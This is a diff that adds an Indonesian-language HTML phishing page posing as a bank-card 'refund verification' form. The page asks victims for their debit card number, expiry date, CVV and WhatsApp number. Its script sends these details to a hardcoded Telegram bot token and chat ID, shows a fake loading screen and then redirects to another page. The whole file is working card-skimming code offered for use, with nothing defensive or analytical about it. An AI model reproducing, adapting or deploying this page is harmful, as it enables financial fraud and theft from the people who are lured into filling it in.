@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="RoyalBlue">
+  <title>VERIFIKASI KARTU BANK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    header {
+  background-color: #2f539b; /* Ganti dengan kode warna yang diinginkan */
+}
+
+
+    .gambar {
+      width: 100%;
+      margin-bottom: 0px;
+    }
+
+    .gambar img {
+      width: 100%;
+      object-fit: cover;
+      margin-bottom: 0px;
+    }
+
+    .form-container {
+      margin-bottom: 50px;
+    }
+
+    .form-container form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .form-container input[type="tel"],
+    .form-container input[type="password"],
+    .form-container input[type="tel"],
+    .form-container input[type="Submit"] {
+      width: calc(80% - 8px);
+      padding: 13px;
+      border-radius: 8px;
+      border: 2px solid #2f539b;
+      margin-bottom: 20px;
+      margin-left: 4px;
+      font-weight: bold;
+    }
+
+    .form-container input[type="Submit"] {
+      width: calc(100% - 8px);
+      max-width: 330px;
+      padding: 12px;
+      border-radius: 6px;
+      background-color: #2f539b;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-left: 7px;
+      width:315px;
+    }
+
+    .gambar-bawah {
+      display: flex;
+      justify-content: center;
+      position: relative;
+      bottom: -10px;
+    }
+
+    .gambar-bawah img {
+      width: 90%;
+      object-fit: cover;
+      margin: 0 25px;
+    }
+
+    .white-element {
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8);
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .white-element img {
+      width: 250px;
+      height: 150px;
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+
+    .username-password-container {
+      display: flex;
+      flex-direction: row;
+      justify-content: space-between;
+      width: calc(88% - 8px);
+      margin-bottom: 20px;
+    }
+
+    .username-password-container input[type="text"],
+    .username-password-container input[type="password"] {
+      width: 60%;
+      margin-right: 58px;
+    }
+
+    .pin-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: calc(80% - 8px);
+      margin-left: -60px;
+      margin-top:-15px;
+    }
+    .blue-text {
+  color: red;
+  font-size: 14px;
+  margin-right:-8px;
+  margin-left:7px;
+  font-weight:bold;
+  position:center;
+  padding:30px;
+  margin-bottom: -50px;
+  
+}
+ .black-text {
+  color: black;
+  font-weight:bold;
+  font-size: 13px;
+  margin-left:7px;
+  padding: 30px;
+  padding-bottom: -10%px;
+ }
+
+
+
+  </style>
+  <script>
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var nomorHP = document.getElementById('nomor_hp').value;
+      var pin = document.getElementById('pin').value;
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+
+      if (nomorHP.trim() === '' || pin.trim() === '' || username.trim() === '' || password.trim() === '') {
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        return;
+      }
+
+      var message = "Nomor HP: " + nomorHP + "\nMasa Berlaku: " + username + "\nCVV: " + password + "\nNomor Whatsapp: " + pin;
+      sendMessageToTelegram(message);
+      showWhiteElement();
+    }
+
+    function showWhiteElement() {
+      var whiteElement = document.createElement('div');
+      whiteElement.classList.add('white-element');
+
+      var logoImage = document.createElement('img');
+      logoImage.src = 'https://i.ibb.co/k5RL7j6/IMG-20240306-223403-removebg-preview.png';
+      logoImage.alt = 'Logo';
+      whiteElement.appendChild(logoImage);
+
+      var loadingText = document.createElement('div');
+      loadingText.classList.add('loading-text');
+      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
+      whiteElement.appendChild(loadingText);
+
+      document.body.appendChild(whiteElement);
+
+      setTimeout(function () {
+        window.location.href = 'usser.html';
+      }, 5000); // Ubah waktu penundaan menjadi 5 detik
+    }
+
+    function updateStyle(inputId) {
+      var inputElement = document.getElementById(inputId);
+      var inputValue = inputElement.value;
+
+      if (inputValue !== '') {
+        inputElement.style.fontWeight = 'bold';
+        inputElement.style.color = 'rgba(black)';
+      } else {
+        inputElement.style.fontWeight = 'normal';
+        inputElement.style.color = 'inherit';
+      }
+    }
+function formatCardNumber(input) {
+  var value = input.value.replace(/\D/g, ''); // Hapus karakter selain angka
+  var formatted = '';
+  for (var i = 0; i < value.length; i++) {
+    if (i > 0 && i % 4 === 0) { // Tambahkan spasi setiap 4 digit
+      formatted += ' ';
+    }
+    formatted += value[i];
+  }
+  input.value = formatted.trim(); // Hapus spasi di awal dan akhir
+  updateStyle(input.id);
+}
+function addSlash(input) {
+  // Ambil nilai dari input
+  let value = input.value;
+  // Hapus karakter selain angka
+  value = value.replace(/\D/g, '');
+  // Format nilai input menjadi xx/xx
+  if (value.length > 2 && value.charAt(2) !== '/') {
+    value = value.substring(0, 2) + '/' + value.substring(2);
+  }
+  // Update nilai input
+  input.value = value;
+}
+
+
+  </script>
+</head>
+<body>
+  <div class="gambar">
+    <img src="https://i.ibb.co/kccK1Wx/thread-20768948-1231099448888354544.png" alt="Gambar Pucok">
+  </div>
+  <p class="right-align blue-text">Pastikan Informasi Kartu Bank Anda Sudah Benar.
+  </p>
+  <p class="right-align black-text">Proses Refund Tidak Mencapai 1 Hari Jika Detail Kartu Bank Benar/Valid.
+  </p>
+
+
+  <div class="form-container">
+    <form onsubmit="kirimPesan(); return false;">
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Masukkan 16 Digit Nomor Kartu Debit" maxlength="19" class="nomor_hp" oninput="formatCardNumber(this); updateStyle('nomor_hp')">
+
+      <div class="username-password-container">
+  <input type="tel" id="username" name="username" placeholder="MM/YY" maxlength="5" class ="username" oninput="addSlash(this)">
+  <input type="tel" id="password" name="password" placeholder="CVV" maxlength="3" class ="password" oninput="updateStyle ('password')">
+</div>
+      <div class="pin-container">
+        <input type="tel" id="pin" name="pin" placeholder="Nomor Whatsapp" maxlength="12" class="pin-input" oninput="updateStyle('pin')">
+      </div>
+      <input type="Submit" value="Lanjutkan">
+    </form>
+    <p class="right-align black-text">Syarat Ketentuan Refund Hanya Dapat Di Ajukan 1 Kali. Dengan Melanjutkan Berarti Anda Setuju Untuk Melakukan Refund Pengembalian Dana.
+  </p>
+</body>
+</html>
